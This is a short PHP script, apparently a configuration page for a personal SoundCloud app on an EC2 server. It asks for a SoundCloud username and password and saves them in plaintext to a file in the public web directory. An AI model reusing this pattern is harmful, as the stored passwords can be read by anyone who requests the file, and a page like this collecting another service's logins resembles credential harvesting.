<?php
echo ("Enter Your Soundcloud Username/Password below");
// configuration
$url = 'http://ec2-54-69-224-246.us-west-2.compute.amazonaws.com/';
//$file = '/home/ec2-user/SCApp/credentials.txt';
$file = '/var/www/html/credentials.txt';

// check if form has been submitted
if (isset($_POST['text']))
{
    // save the text contents
    file_put_contents($file, $_POST['text']);

    // redirect to form again
    header(sprintf('Location: %s', $url));
    printf('<a href="%s">Moved</a>.', htmlspecialchars($url));
    exit();
}

// read the textfile
$text = file_get_contents($file);

?>
<!-- HTML form -->
<form action="" method="post">
<textarea style="width: 200px; height: 50px; border: 3px solid #cccccc; padding: 5px" rows=25 columns=100 name="text">username@example.com
password</textarea>
<input type="submit" />
<input type="reset" />
</form>

